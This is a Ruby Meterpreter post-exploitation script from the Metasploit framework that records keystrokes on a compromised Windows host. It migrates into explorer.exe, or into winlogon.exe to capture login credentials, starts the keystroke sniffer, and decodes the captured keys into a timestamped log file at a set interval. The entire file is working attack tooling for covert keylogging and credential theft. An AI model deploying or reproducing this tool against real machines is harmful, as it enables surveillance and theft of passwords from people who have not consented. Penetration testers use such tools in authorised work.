# $Id$
#
# Meterpreter script for monitoring and capturing Keystrokes and
# saving them in to  a file.
# Provided by Carlos Perez at carlos_perez[at]darkoperator.com
session = client
# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false, "Help menu." ],
	"-t"  => [ true,  "Time interval in seconds between recollection of keystrokes, default 30 seconds." ],
	"-c"  => [ true,  "Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0." ]
)
def usage
	print_line("Keylogger Recorder Meterpreter Script")
	print_line("This script will start the Meterpreter Keylogger and save all keys")
	print_line("in a log file for later anlysis. To stop capture hit Ctrl-C")
	print_line("Usage:" + @@exec_opts.usage)
	raise Rex::Script::Completed
end


#Get Hostname
host,port = session.tunnel_peer.split(':')

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
logs = ::File.join(Msf::Config.config_directory, 'logs', 'keylogrecorder', host + filenameinfo )

# Create the log directory
::FileUtils.mkdir_p(logs)

#logfile name
logfile = logs + ::File::Separator + host + filenameinfo + ".txt"

#Interval for collecting Keystrokes in seconds
keytime = 30

#Type of capture
captype = 0

# Function for writing results of other functions to a file
def filewrt(file2wrt, data2wrt)
        output = ::File.open(file2wrt, "a")
        data2wrt.each_line do |d|
                output.puts(d)
        end
        output.close
end
#Function to Migrate in to Explorer process to be able to interact with desktop
def explrmigrate(session,captype)
	begin
		if captype.to_i == 0
			process2mig = "explorer.exe"
		elsif captype.to_i == 1
			process2mig = "winlogon.exe"
		else
			process2mig = "explorer.exe"
		end
		# Actual migration
		mypid = session.sys.process.getpid
		session.sys.process.get_processes().each do |x|
			if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
				print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
				session.core.migrate(x['pid'].to_i)
				print_status("Migration Successful!!")
			end
		end
		return true
	rescue
		print_status("Failed to migrate process!")
		return false
	end
end

#Function for starting the keylogger
def startkeylogger(session)
	begin
		#print_status("Grabbing Desktop Keyboard Input...")
		#session.ui.grab_desktop
		print_status("Starting the keystroke sniffer...") 
		session.ui.keyscan_start
		return true
	rescue
		print_status("Failed to start Keylogging!")
		return false
	end
end

#Funtion for Collecting Capture
def keycap(session, keytime, logfile)
	begin
		rec = 1
		#Creating DB for captured keystrokes
		print_status("Keystrokes being saved in to #{logfile}")
		#Inserting keystrokes every number of seconds specified
		print("[*] Recording .")
		while rec == 1
			#getting Keystrokes
			data = session.ui.keyscan_dump
			outp = ""
			data.unpack("n*").each do |inp|
				fl = (inp & 0xff00) >> 8
				vk = (inp & 0xff)
				kc = VirtualKeyCodes[vk]

				f_shift = fl & (1<<1)
				f_ctrl  = fl & (1<<2)
				f_alt   = fl & (1<<3)

				if(kc)
					name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
					case name
					when /^.$/
						outp << name
					when /shift|click/i
					when 'Space'
						outp << " "
					else
						outp << " <#{name}> "
					end
				else
					outp << " <0x%.2x> " % vk
				end
			end
			sleep(2)
			filewrt(logfile,"#{outp}\n")
			print(".")
			sleep(keytime.to_i)
		end
		db.close
	rescue::Exception => e
		print("\n")
		print_status("#{e.class} #{e}")
		print_status("Stopping keystroke sniffer...")
		session.ui.keyscan_stop
	end
end

# Parsing of Options
helpcall = 0
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-t"
		keytime = val
	when "-c"
		captype = val
	when "-h"
		usage
	end
}
if explrmigrate(session,captype)
	if startkeylogger(session)
		keycap(session, keytime, logfile)
	end
end
